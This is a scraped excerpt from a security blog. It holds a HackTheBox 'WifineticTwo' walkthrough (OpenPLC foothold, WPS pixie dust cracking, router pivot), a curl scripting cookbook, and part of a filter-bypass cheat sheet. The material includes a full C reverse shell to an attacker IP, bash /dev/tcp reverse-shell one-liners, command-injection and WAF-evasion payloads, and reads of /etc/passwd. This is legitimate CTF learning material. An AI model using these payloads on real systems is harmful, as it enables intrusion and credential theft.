GetRequest: | HTTP/1.0 302 FOUND | content-type: text/html; charset=utf-8 | content-length: 219 | location: http://0.0.0.0:8080/login | vary: Cookie | set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZfnVkg.t4WLI6BzeURnoNyj8hSuMVa9QEE; Expires=Tue, 19-Mar-2024 18:17:34 GMT; HttpOnly; Path=/ | server: Werkzeug/1.0.1 Python/2.7.18 | date: Tue, 19 Mar 2024 18:12:34 GMT | &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt; | &lt;title&gt;Redirecting...&lt;/title&gt; | &lt;h1&gt;Redirecting...&lt;/h1&gt; | &lt;p&gt;You should be redirected automatically to target URL: &lt;a href=&#34;/login&#34;&gt;/login&lt;/a&gt;. If not click the link. | HTTPOptions: | HTTP/1.0 200 OK | content-type: text/html; charset=utf-8 | allow: HEAD, OPTIONS, GET | vary: Cookie | set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZfnVkg.r0NSCAEVwBMvIGd1INwNHuskFTU; Expires=Tue, 19-Mar-2024 18:17:34 GMT; HttpOnly; Path=/ | content-length: 0 | server: Werkzeug/1.0.1 Python/2.7.18 | date: Tue, 19 Mar 2024 18:12:34 GMT | RTSPRequest: | HTTP/1.1 400 Bad request | content-length: 90 | cache-control: no-cache | content-type: text/html | connection: close | &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt; | Your browser sent an invalid request. |_ &lt;/body&gt;&lt;/html&gt; | http-title: Site doesn&#39;t have a title (text/html; charset=utf-8). |_Requested resource was http://10.10.11.7:8080/login Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server&#39;s resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_ http://ha.ckers.org/slowloris/ UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
All 100 scanned ports on 10.10.11.7 are in ignored states. Not shown: 67 closed udp ports (port-unreach), 33 open|filtered udp ports (no-response) Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=wifinetictwo.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Wow - that&rsquo;s some old software. Still running Python 2.7.18.
To be honest, this box doesn&rsquo;t seem to have any significant web component - so I&rsquo;ll forego the remainder of my web enumeration (for now).
Exploring the Website risus at ultrices mi tempus imperdiet nulla malesuada pellentesque elit eget gravida cum sociis natoque penatibus et magnis dis parturient
OpenPLC - probably open source, right? Worth checking for default credentials.
A quick search reveals that the defaults are openplc : openplc. Indeed, they work!
OpenPLC appears to be an (archived) solution for creating software-based PLCs. It can target all kinds of devices, ranging from x86 linux machines, to Raspberry Pis, and even Arduinos.
FOOTHOLD Reverse Shell from Hardware While the version number of the target is unclear, a quick check to searchsploit openplc shows an RCE exploit - EDB-ID 49803. Reading through the exploit script reveals how it works: It uploads a new &ldquo;program&rdquo; to the Programs tab of the OpenPLC dashboard, then rewrites the code in the Hardware tab, inserting a typical reverse shell written in C.
I&rsquo;ll open up a reverse shell listener to try out the exploit with:
# Open the firewall for the listener sudo ufw allow from $RADDR to any port 4444,8000 proto tcp # Start the reverse shell listener bash nc -lvnp 4444 No luck. The exploit failed to open a reverse shell - either with or without my explicitly starting my own listener.
Some additional research into OpenPLC vulnerabilities turned up CVE-2021-31630. After reading through this CVE description, it&rsquo;s clear that this is exactly the vulnerability that the premade exploit was utilizing.
Why does that matter? Well, the principle behind the exploit might still be useful, even if some of the details aren&rsquo;t working.
Note: the attempts I made with the premade exploit left behind some malformed files on OpenPLC. To delete these, I simply double-clicked their entries in Programs and selected Remove Program.
Since the premade exploit failed, I set out to try to emulate what it was doing - just to see where things were failing. First, the script appears to upload a program (an .st file) that is identical to blank_program.st, the default program in OpenPLC. As such, I selected blank_program.st from the Programs tab. Using Launch Program or Update Program from that screen appears to set that program as the &ldquo;active&rdquo; one, as seen in the header bar of the dashboard:
Second, after loading the program, the exploit uses the Hardware tab to insert a C reverse shell into the updateCustomOut() function of the Blank (Linux) template:
#include &#34;ladder.h&#34; // for OpenPLC #include &lt;stdio.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; int ignored_bool_inputs[] = {-1}; int ignored_bool_outputs[] = {-1}; int ignored_int_inputs[] = {-1}; int ignored_int_outputs[] = {-1}; void initCustomLayer() { } void updateCustomIn() { } void updateCustomOut() { int port = 4444; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.sin_family = AF_INET; revsockaddr.sin_port = htons(port); revsockaddr.sin_addr.s_addr = inet_addr(&#34;10.10.14.6&#34;); connect(sockt, (struct sockaddr *) &amp;revsockaddr, sizeof(revsockaddr)); dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2); char * const argv[] = {&#34;/bin/sh&#34;, NULL}; execve(&#34;/bin/sh&#34;, argv, NULL); return; // Don&#39;t return 0 } When I updated the Hardware tab to use the above code, it seemed to all compile fine. Then, after clicking Run Program, I saw a reverse shell appear!
USER FLAG Since this shell is a little rudimentary, I&rsquo;ll upgrade it a bit:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color stty rows 48 columns 197 # from stty -a Read the flag We&rsquo;re on the root user already. Checking /root reveals that the user flag is sitting right there. Just cat it out for the points:
cat /root/user.txt This is a strong indication that we&rsquo;ll need to pivot to another system before we&rsquo;ll be able to find the root flag.
ROOT FLAG Getting my Tools Since I know that I&rsquo;ll need to pivot to another system, it&rsquo;s very likely that a tool like chisel will be very useful. To provide it, I&rsquo;ll start up a python webserver from my attacker box:
# From attacker ./chisel server --port 9999 --reverse &amp; python3 -m http.server 8000 # From target mkdir -p /tmp/.Tools cd /tmp/.Tools curl -o chisel http://10.10.14.6:8000/chisel chmod +x chisel ./chisel client 10.10.14.6:9999 R:1080:socks &amp; The box name is &ldquo;WifineticTwo&rdquo;. There&rsquo;s a pretty solid chance that it has something to do with WiFi. To investigate, I checked ifconfig:
As suspected, there is a WiFi interface, wlan0. Currently though, it&rsquo;s not connected to anything. Since the target doesn&rsquo;t seem to be using networkmanager or anything, I&rsquo;ll use iw to interact with the interface:
# Turn this interface link layer on. ip link set wlan0 up # Scan for access points iw dev wlan0 scan Very interesting. We can see an access point called plcrouter that is using WPS authentication. WPS is notorious for providing very poor security. It can be used in pushbutton, PIN, or NFC modes. The PIN mode is especially bad, and leads to all kinds of possible attacks, such as a Pixie Dust attack.
Finding a WiFi Credential tldr; There are lots of ways to do a pixie dust attack. Don&rsquo;t waste your time with bully, reaver, pixiewps, or Oneshot-C.
bully and reaver would both have needed to be installed on the system, or compiled with static linking, and I found Oneshot-C to be very fail-prone, leaving wireless interface in an unrecoverable state (only fixable by resetting the box!)
Save your time and skip straight to using Oneshot, available at this repo &#x2b50;
As mentioned above, there is an excellent tool available for performing a pixie dust attack, called Oneshot. It runs in python, thus avoiding the dependency issues of other comparable tools. I downloaded it onto my attacker machine, then transferred it using a webserver. Any file transfer technique would be fine.
Great, all we need to do is supply it with the name of the network interface, and the -K flag:
The password was cracked in under a second. Glorious &#x1f60d;
We now have the credential plcrouter : NoWWEDoKnowWhaTisReal123!
Aside: using Reaver instead Note that this was not a desirable option because Reaver has the runtime dependency of libpcap-dev (pcap.h). To use it in this scenario, we would have either needed to install libpcap-dev on the target, or compiled reaver with static linking.
Both options are a little more trouble than we need to go to.
First, we jot down the BSSID of the target access point. This was visible from running iw wlan0 scan. (It was 02:00:00:00:01:00)
Next, we place the wifi adapter into monitor mode so it can read arbitrary packets off the air:
ip link set wlan0 down iw dev wlan0 set monitor none ip link set wlan0 up Then, we run reaver, pointing it at the correct BSSID:
reaver -i wlan0 -b 02:00:00:00:01:00 -K -vv It will do it&rsquo;s thing and terminate quite quickly - it only needs to make 11000 guesses to do a pixie dust attack. Cleaning up, we place the wifi adapter back into managed mode:
ip link set wlan0 down iw dev wlan0 set type managed ip link set wlan0 up If we were running network-manager or wpa_supplicant, you stop them when you place the interface into monitor mode, and restart them when you&rsquo;re done.
Connecting to WiFi Using iw &#x1f6ab; This was not the correct way. While it&rsquo;s informative, this section is not necessary: skip ahead if you&rsquo;re short on time.
For reference, this is the situation prior to connecting:
My first attempt to connect was using the PSK itself:
However, as shown in the above image, that isn&rsquo;t the correct format. For key, it&rsquo;s expecting a different format. It tells us that we need to use wpa_passphrase:
Alternatively, parse the output like this:
PSK=$(wpa_passphrase plcrouter &#39;NoWWEDoKnowWhaTisReal123!&#39; | grep -E &#39;psk=[0-9a-f]+\\b&#39;); PSK=\${PSK:5} Note that the syntax for connecting with iw is quite particular:
key must be [d:]index:data where &#39;d:&#39; means default (transmit) key &#39;index:&#39; is a single digit (0-3) &#39;data&#39; must be 5 or 13 ascii chars or 10 or 26 hex digits for example: d:2:6162636465 is the same as d:2:abcde or psk:data &lt;AKM Suite&gt; &lt;pairwise CIPHER&gt; &lt;groupwise CIPHER&gt; where &#39;data&#39; is the PSK (output of wpa_passphrase and the CIPHER can be CCMP or GCMP for example: psk:0123456789abcdef PSK CCMP CCMP The allowed AKM suites are PSK, FT/PSK, PSK/SHA-256 The allowed Cipher suites are TKIP, CCMP, GCMP, GCMP-256, CCMP-256 root@attica02:/tmp/.Tools# We already saw from iw wlan0 scan what the AKM Suite, pairwise cipher, and groupwise cipher are:
As such, this should be correct:
PSK=$(wpa_passphrase plcrouter &#39;NoWWEDoKnowWhaTisReal123!&#39; | grep -E &#39;psk=[0-9a-f]+\\b&#39;) PSK=\${PSK:5} iw dev wlan0 connect plcrouter key &#34;psk:$PSK&#34; PSK CCMP CCMP Not sure why, but it isn&rsquo;t working. The result is command failed: Invalid argument (-22). I&rsquo;ll look into this later &#x1f6a9;
Using wpa_supplicant This is the method that I&rsquo;ve actually used before. It involves writing a config file for wpa_supplicant then connecting with it.
First, make a directory for wpa_supplicant to run from:
mkdir /tmp/.Tools/wpa_supplicant Then, define a configuration file, I called mine wpa_supplicant.conf:
ctrl_interface=/tmp/.Tools/wpa_supplicant update_config=1 network={ ssid=&#34;plcrouter&#34; psk=&#34;NoWWEDoKnowWhaTisReal123!&#34; key_mgmt=WPA-PSK } Then, we use wpa_supplicant to connect using the above config. Be sure to background the process, as wpa_supplicant runs as a daemon:
wpa_supplicant -c /tmp/.Tools/wpa_supplicant.conf -i wlan0 &amp; It looks like we were successful:
Now that we&rsquo;re connected, attica01 is now in two networks:
Our attacker is connected via the VPN, on 10.0.3.2 / 24 and wlan0 is in fe80::ff:fe00:200 / 64
Exploring the WiFi Fortunately, I already opened a proxy using chisel. This allows me to use nmap from the comfort of my own attacker box:
sudo proxychains nmap -sT -n -p22 -T5 -6 fe80::ff:fe00:200/8 We restrict nmap to using TCP probes, and only bother checking port 22 (since we know that the target we&rsquo;re looking for has port 22 listening). Additionally, we tell it we&rsquo;re using IPv6 notation.
&#x1f914; Hmm, this isn&rsquo;t working&hellip;. Frankly, I&rsquo;m not sure if the problem lies in the fact that I&rsquo;m using IPv6 or if I&rsquo;m using proxychains incorrectly.
I tried a couple other methods to try to get the address of the router:
# Check the arp cache arp -va # Check the routing table route -A inet6 route -n -6 -v Maybe there&rsquo;s a way to get an IPv4 address? Usually, routers also run DHCP. Maybe I can just request an address?
which dhclient dhcpcd # /usr/sbin/dhclient Ok, I&rsquo;ll request one using dhclient then:
&#x1f915; As soon as I requested the address, the box froze. Maybe a coincidence?
**Edit: No, after repeating everything and getting back to this point, I yet again requested an address and the box froze. **
Hopefully they&rsquo;ll fix this on the box. For now, be sure to use -v verbose mode when requesting an IP, so you get output before the box crashes
Thankfully, now I know the address that it would have assigned. I should be able to just self-assign this address and move on.
ip addr add 192.168.1.84/255.255.255.0 dev wlan0 Perfect. Now, I could try proxying nmap again, or I could just ping the rest of the network in a for loop:
for (( i=1; i&lt;255; i++ )); do ping -c 1 -W 1 &#34;192.168.1.$i&#34; | grep &#39;time=&#39; ; done Well, either it&rsquo;s just this box and the router, or there&rsquo;s something else and it&rsquo;s ignoring ICMP &#x1f914;
If this is actually a router, there&rsquo;s a pretty solid chance it has a web interface for configuration, right? Let&rsquo;s check:
There&rsquo;s definitely something! I navigated to that link in a browser window to take a look:
proxychains firefox --safe-mode http://192.168.1.1/cgi-bin/luci I&rsquo;m using --safe-mode to decrease the amount of traffic from the browser. Without it, there is too much traffic generated form the browser itself and its extensions. With all that traffic, you need to wait for it to time out before the page will actually load.
Ain&rsquo;t nobody got time for that!
Shall we try something simple, like root : root ..?
&#x1f602; Wow, nice! first guess. Default credentials strikes again.
Honestly though, it&rsquo;s not that unrealistic. So many people I&rsquo;ve met never bother to change their router password. They think they&rsquo;re protected by the password on the wifi.
The page footer shows the exact software versions:
Let&rsquo;s obey that big yellow banner and reset the password - It looks like we need to set a password to gain SSH access to the router. If you check out System &gt; Administration &gt; SSH, it says that SSH authentication can be enabled, but hints that we would need a valid password - that implies that the system considers using default credentials as &ldquo;passwordless&rdquo;:
System &gt; Administration &gt; Router Password has a form to reset the password:
The new credential is root : 4lbatro55.
Next steps? There&rsquo;s lot&rsquo;s of options from here. Suspecting that I was actually in a docker container in the OpenPLC box, attica2, my initial reaction is that I need to eventually SSH back into that host, thus performing a docker escape. If that&rsquo;s the plan, then setting up port forwarding within this router would be very useful.
Regardless, I&rsquo;ll know more once I check out SSH on the router.
SSH to OpenWRT Now that I&rsquo;ve set a fresh password, I should be able to to just log in via SSH. Perhaps from there I&rsquo;ll have a better view about how to proceed.
Thankfully, my reverse shell is quite upgraded, so it&rsquo;s no problem to just SSH directly from attica02 to the OpenWRT router, ap:
Oh, what?! Nice!! The flag is just sitting there. I was expecting there to be another pivot &#x1f602;
Just cat the flag and submit for some points! &#x1f389;
cat root.txt EXTRA CREDIT Nmap through a proxy Now that I&rsquo;ve finished the box, I&rsquo;ve left it with an IPv4 address. Will this solve my problem with using nmap through a socks5 proxy?
sudo proxychains nmap -sT -Pn -n -p22 -T5 --host-timeout 500ms 192.168.1.84/24 | tee nmap_ssh_scan.log Here, I&rsquo;m using several important options:
-sT forces nmap to perform a TCP Connect scan, even though I&rsquo;m running with sudo -Pn Skip host discovery (We&rsquo;re using the presence of SSH instead of typical host discovery methods.) -n Just use IP addresses. Don&rsquo;t waste time with DNS resolution. -p22 Only check port 22, SSH -T5 Go as fast as possible --host-timeout 500ms Don&rsquo;t wait for a single host any longer than 500ms. It looks like it was successful! Who knew that IPv6 would be such a hassle?
LESSONS LEARNED Attacker Feel free to adjust old exploits. On this box, initial foothold was gained by using a C reverse shell. While the publicly available exploit (from searchsploit and exploit DB) did not work, it was easy to just read through the code and figure out what it was trying to do. From there, the whole exploit could be summarized into two easily-reproducible steps. Pixie dust attack is delightfully fast. If you&rsquo;re doing any kind of wireless assessment, this should be near the top of your checklist. Plus, you can even determine whether or not it&rsquo;s a viable attack even through passive recon techniques. Default credentials should always, always, be checked first. It doesn&rsquo;t take long at all to find out what default credentials are. If it&rsquo;s a sufficiently old product, you can even just ask ChatGPT or other LLMs. IPv6 is somehow still a hassle. I thought it was going to save us all from the dwindling supply of IP addresses, but it turns out that tooling is still catching up to using IPv6. If you can use IPv4 during your tests, just go ahead and do it. Defender Obsolete/archived software and devices should not have access to the internet. If you want to run legacy equipment or software, do it safely. Personally, I have a few devices that fall under this category, but they all reside in an air-gapped network and have no way of ever accessing the internet. A great example of things you might have that fall under this category are printers: if you still want that ten-year old unsupported printer to live on your network, that&rsquo;s fine - just put it inside a network with no internet access.
Pixie dust attack is delightfully horrifyingly fast. If you still have WPS enabled for some reason, please put down your laptop/phone right now and go disable it. The only legitimate use of WPS these days is for NFC access (and even that is not ideal). Have guests coming over? Just start a guest network! Also, I think that WPA3 can&rsquo;t be used alongside WPS; that should be a good enough reason to ditch WPS.
Secure your router. These are my recommended actions, and are usually all available even on cheap routers. Change the router password if it&rsquo;s default, disable WPS; disable remote connection; use a good PSK; prefer WPA3 over WPA2, and never use WPA or WEP; know your exposure with &ldquo;guest&rdquo; wifi; secure NFS mounts; if possible, implement MAC filtering.
`,url:"https://4wayhandshake.github.io/walkthrough/wifinetictwo/"},"https://4wayhandshake.github.io/strategy/curl-scripting/":{title:"cURL Scripting",tags:["curl","bash","scripting"],categories:["Strategy","CTF","Web"],content:`INTRODUCTION Why write this? Because who needs browsers when you can just pipe curl into bash and parse with grep, sed, and awk &#x1f639;
Sometimes I find myself in a circumstance where I want to do a little bit of automation/scripting with web requests, but I don&rsquo;t feel like writing a whole Python script for it. At least for me, a really common circumstance for me wanting to do this is when I want to automate some kind of login where I encounter a CSRF check.
Using my Burp proxy and my web browser&rsquo;s Dev Tools pane&hellip; Too pendandic! TOO MANY CLICKS!!
Using Python + Selenium&hellip; WAY OVERKILL FOR SUCH SIMPLE TASK!
Sometimes I would like to have a bit of a code cookbook for writing the scripts more rapidly - that&rsquo;s the biggest reason why I&rsquo;m writing this.
Disclaimer There are tons of ways to do this. I&rsquo;m just presenting a way that I like to use when I want to do something quick.
SNIPPETS Below are some self-contained ways to make a request, that I find useful.
Deal with Self-signed Certs curl -sk https://subdomain.domain.tld/resource Use -s to suppress all the loading bars. Use -k to perform an insecure HTTPS request
POST to an API, Parse the JSON Here, we&rsquo;re expecting a 40-character hex value from a JSON response from an API
DATA=&#34;username=myname&amp;password=password123&#34; COOKIE=&#34;PHPSESSID=1234567890abcdef1234567890&#34; RESP=$(curl -sk -b $COOKIE -d $DATA https://subdomain.domain.tld/resource/authenticate) echo $RESP | grep -oE &#39;[0-9a-fA-F]{40}&#39; Use -o with grep to only return the matched text.
Proxy through Burp I usually have my Burp proxy on port 8081.
curl --proxy &#34;127.0.0.1:8081&#34; -k https://subdomain.domain.tld/resource Read a Cookie from a Response Combine grep and awk to extract the cookie
RESPONSE=$(curl -isk https://subdomain.domain.tld/give-me-a-cookie.php) COOKIE=$(echo &#34;$RESPONSE&#34; | grep -i &#39;Set-Cookie&#39; | head -n 1 | awk &#39;{print $2}&#39;) Use the -i flag with curl to be able to parse the response headers
Trim Off Quotes, Remove Semicolon Easiest to do this in two operations:
RESPONSE=$(curl -isk https://subdomain.domain.tld/page-holding-important-value.php) BODYVAL=$(echo &#34;$RESPONSE&#34; | grep -i &#39;nsp_str&#39; | awk &#39;{print $4}&#39; | sed &#39;s/\\&#34;//g&#39;) BODYVAL=\${BODYVAL%?} # Use parameter expansion to remove final character Here, the value is the fourth word in the matched string. We immediately strip off the quotation marks using sed substitution. Then use parameter expansion to remove the final character of the value.
CONCLUSION Using the above snippets, all kinds of crazy scripts can be written to mimic browser interaction. The possibilities are endless!
`,url:"https://4wayhandshake.github.io/strategy/curl-scripting/"},"https://4wayhandshake.github.io/strategy/filter-bypass/":{title:"Filter Bypass Techniques",tags:["Regex","Evasion","URL Encoding","Fullwidth","WAF"],categories:["Strategy","CTF","Web"],content:`INTRODUCTION Why write this? Too often, I&rsquo;ve found myself in a situation where I needed to bypass some kind of filter and wanted a checklist to reference. However, when searching for such a checklist, I encounter two difficulties with the references I find:
Information is far too task-specific. Many are only about XSS filter evasion, or only about WAFs. There&rsquo;s just too much. Many of these references have hundreds of different techniques to try. And that&rsquo;s great, if you&rsquo;re trying to hack the Pentagon, but for a Easy-to-Medium HTB box it&rsquo;s way overkill. This post is primarily a reference for myself. Consider it a &ldquo;greatest hits&rdquo; collection of filter bypasses that I have personal experiences with. I won&rsquo;t be explaining how they work.
Disclaimer Other people have written far more comprehensive guides for this. If you want more detail, go find one of them.
Also, many of the bypasses I&rsquo;ve recorded are categorized, but some are broadly applicable. And most of the time, you&rsquo;ll need to use multiple bypasses simultaneously. Don&rsquo;t think you should only read one section.
TOOLS Automation &#x2b50; Try WhatWaf, available at this repo. It will attempt to detect and evade WAFs for you. Very handy
Bypass / Obfuscation For Linux, an incredible tool for all kinds of bash-based bypasses is Bashfuscator. Just feed it a command and let it figure out all kinds of crazy bypasses and obfuscations:
Note: You&rsquo;ll need to clone the repo and run the setup script: python3 setup.py install --user
# You MUST switch to bash before attempting to use bashfuscator bash # Use randomized mutations and obfuscations: bashfuscator -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.27/4444 0&gt;&amp;1&#39; # Use a more modest set of obfuscation, for much shorter payloads: bashfuscator -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.27/4444 0&gt;&amp;1&#39; -s 1 -t 1 --no-mangling --layers 1 &#x26a0;&#xfe0f; Bashfuscator is great, but it&rsquo;s not even close to 100% accurate! Be sure to test your payloads locally before trying them against a target.
There is a really similar tool for Windows called Dosfuscation. Using an interactive &ldquo;wizard&rdquo; prompt, generate the payload. Then the payloads can be used in Windows cmd.
Note: You&rsquo;ll need to follow the installation notes to set up this tool.
Invoke-DOSfuscation Invoke-DOSfuscation&gt; SET COMMAND type C:\\Users\\jimbob\\Desktop\\my-passwords.txt Invoke-DOSfuscation&gt; encoding Invoke-DOSfuscation\\Encoding&gt; 1 Then you can just copy-paste the resulting payload into cmd.
Re-encoding Download my encoding-tools repo and &ldquo;install&rdquo; it. I&rsquo;ll use it for URL-encoding and fullwidth-encoding Cyberchef is fantastic, but hard to integrate into scripts. Burp is great, but sometimes it&rsquo;s too much clicking and copy-pasting. Python is versatile and integrates very well into scripts, but you&rsquo;ll need to write a little code. Bash is perfect for integrating into scripts, best used in short pipelines of things. Use an LLM such as ChatGPT if you don&rsquo;t need to script it, or want to learn more about the encoding. URL-encoding using Python3: Try my my encoding-tools repo. To use the script, just call it from anywhere:
url_encode &#39;hello newline \\n&#39; # hello+newline+%0A echo -n &#39;hello newline \\n&#39; | url_encode # hello+newline+%0A URL-encoding with jq: You can also url-encode py piping text into jq:
echo -n &#39;hello newline \\n&#39; | jq -sRr @uri Fullwidth encoding using Python3: Again, try my my encoding-tools repo. To use the script, just call it from anywhere:
fullwidth_encode &#39;fullwidth!&#39; # ｆｕｌｌｗｉｄｔｈ！ echo &#39;fullwidth!&#39; | fullwidth_encode # ｆｕｌｌｗｉｄｔｈ！ Hex using Bash: # encoding as hex echo -n &#39;this is utf-8 text&#39; | xxd -p # decoding it echo -n &#39;74686973206973207574662d382074657874&#39; | xxd -r -p Remember to use -n with echo to suppress the line ending character.
BYPASSES Here is a practical example that uses a few bypasses. All of the tricks are outlined later in this section.
The below tricks abuse a form that takes raw input to a ping command. This is the command we want to use:
cat /home/jimbob/flag.txt It has a variety of filters in place, so it took a few bypasses to get past them all:
ip=127.0.0.1%0A{c%24%40at,\${PATH:0:1}home\${PATH:0:1}jimbob\${PATH:0:1}flag.txt} To inject a new command: append with a newline (%0A) character To bypass the filter blocking spaces: bash parameter expansion {cat,/home/jimbob/flag.txt} To bypass the filter blocking slashes: bash parameter expansion of PATH variable \${PATH:0:1} To bypass the filter blocking the cat command: insert the url-encoded version of $@ (%24%40) into the middle of the command. Replacing Spaces Spaces are often filtered out, whether in WAFs, application logic, or many other sinks. Thankfully, there are a bunch of creative ways around using spaces.
For a much, much more complete list, check out PayloadAllTheThings
Use tabs wherever you might use a space. In this way, %20 becomes %09:
cat%09/etc/passwd Use the \${IFS} Linux environment variable. By default, it represents a space and a tab:
cat\${IFS}/etc/passwd Use brace expansion to eliminate whitespace completely:
{&#39;cat&#39;,&#39;/etc/passwd&#39;} Use input redirection instead of a space, when one side of a space is a file:
cat&lt;/etc/passwd bash&lt;/dev/tcp/10.10.14.78/4444 Use ANSI-C variable quotation:
X=$&#39;cat\\x20/etc/passwd&#39;&amp;&amp;$X Replacing Slashes Linux (forward slash) Use bash-style parameter expansion. Just like you can reference variables as \${variable} or its length as \${#variable}, you can pick out arbitrary characters from known variables by using the parameter expansion substring operator: \${varname:start:length}:
cat \${PATH:0:1}etc\${PATH:0:1}passwd Thankfully, there are quite a few really predictable environment variables. For example, PATH and HOME should always start with a slash.
Windows (backslash) For Windows CMD, you can use a similar principle. Assume we know the username, then we know its length too. We can use this knowledge to extract a backslash. For example, say the username is jimbo, which is 5 characters long; we can extract the backslash at position 6, 5 chars from the end of the string :
echo %HOMEPATH:~6,-5% With Powershell, this is even easier. Words are internally considered arrays, so just access the first character:
$env:HOMEPATH[0] Note: to see all environment variables in Powershell, use Get-ChildItem Env:
Replacing Colons Use bash-style parameter expansion. See Replacing Slashes for more detail. There are a few variables that contain colons. One especially useful one is LS_COLORS:
# If a space is allowed: \${LS_COLORS: -1} # If spaces are blacklisted too: \${LS_COLORS:\${#LS_COLORS}-1:1} # Use nested parameter expansion to obtain final character \${LS_COLORS:10:1} # Use a predetermined location to get the colon Replacing Pipes
Pipes are often blocked, do to their importance in a variety of shells. To get around this, you can try using a bash &ldquo;herestring&rdquo; &lt;&lt;&lt; operator with a subshell $(...):
$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) Character Shifting Linux Characters can be accessed by shifting characters by using the tr command. You can map one set of characters to another set by using tr like this:
tr &#39;!-}&#39; &#39;&#34;-~&#39; This maps the range of characters between ! and } onto the range of characters &quot; to ~. Note: ! is the first printable character, } is the second-last. Likewise, &quot; is the second printable character, and ~ is the last. I.e. the two ranges have equal lengths.
In short, the above will shift the printable alphabet to increase the character code by 1.
You could swap the arguments to shift the printable alphabet to decrease the character code by 1:
tr &#39;&#34;-~&#39; &#39;!-}&#39; To utilize these shifts, you can use the &lt;&lt;&lt; operator to input characters or text:
echo $(tr &#39;!-}&#39; &#39;&#34;-~&#39;&lt;&lt;&lt;abc) # bcd echo $(tr &#39;&#34;-~&#39; &#39;!-}&#39;&lt;&lt;&lt;xyz) # wxy You can also play with the ranges. This will increase by 2 characters:
tr &#39;!-{&#39; &#39;#-~&#39; And to get a semicolon, you could shift from a 9:
echo $(tr &#39;!-{&#39; &#39;#-~&#39;&lt;&lt;&lt;9) Web App Firewall (WAF) &ldquo;Common bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using linebreaks or tabs&rdquo; - Ally Pettit
Exchange characters for unicode instead:
# ascii to UTF-8 unicode: echo -n &#39;Special ch@r5 :)&#39; | xxd -p | sed &#39;s/../\\\\u&amp;/g&#39; # \\u53\\u70\\u65\\u63\\u69\\u61\\u6c\\u20\\u63\\u68\\u40\\u72\\u35\\u20\\u3a\\u29 # ascii to UTF-16 unicode: echo -n &#34;Special ch@r5 :)&#34; | iconv -t UTF-16LE | xxd -p -c 2 | sed &#39;s/\\(..\\)\\(..\\)/\\\\u\\2\\1/g&#39; | tr -d &#39;\\n&#39; #\\u0053\\u0070\\u0065\\u0063\\u0069\\u0061\\u006c\\u0020\\u0063\\u0068\\u0040\\u0072\\u0035\\u0020\\u003a\\u0029 URL encode the text
echo -n &#39;Just some normal text&#39; | url_encode or double URL encode it:
echo -n &#39;Just some normal text&#39; | url_encode | url_encode Use an alternate charset, like ibm037 (Example taken from this blog post):
First, generate the data / payload. This is how you&rsquo;d do it with the python interpreter:
import urllib.parse s = &#39;&lt;script&gt;alert(&#34;xss&#34;)&lt;/script&gt;&#39; urllib.parse.quote_plus(s.encode(&#34;IBM037&#34;)) # &#39;L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n&#39; Then, use that in an http request:
POST /comment/post HTTP/1.1 Host: boxname.htb Content-Type: application/x-www-form-urlencoded; charset=ibm037 Content-Length: 74 %A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3 Base-64 encoding can also be effective:
# Encoding (Note that these encode the text &#39;whoami&#39;, not the command result.) echo whoami | base64 -w 0 base64 -w 0 &lt;&lt;&lt; whoami # Decoding echo d2hvYW1pCg== | base64 -d # Encoding [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;)) #Decoding iex &#34;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;d2hvYW1pCg==&#39;)))&#34; Command Filters Blacklisted commands can be bypassed by inserting characters the get parsed out of the command.
Insert quotes so that the whole word isnt recognized:
w&#39;h&#39;o&#39;am&#39;i This works with doublequotes too. Note that number of quotes must be even, and you can&rsquo;t mix types of quotes
Insert empty characters. In Linux, you can freely use $@ if you&rsquo;re not in the context of a script:
who$@ami Insert backslashes for regular characters:
who\\ami Insert caret if you&rsquo;re using Windows:
who^ami Reverse the whole command to bypass a blocked command
In Linux, run the text through rev:
$(rev&lt;&lt;&lt;&#39;imaohw&#39;) In Windows (Powershell), use string manipulation and iex for the subshell:
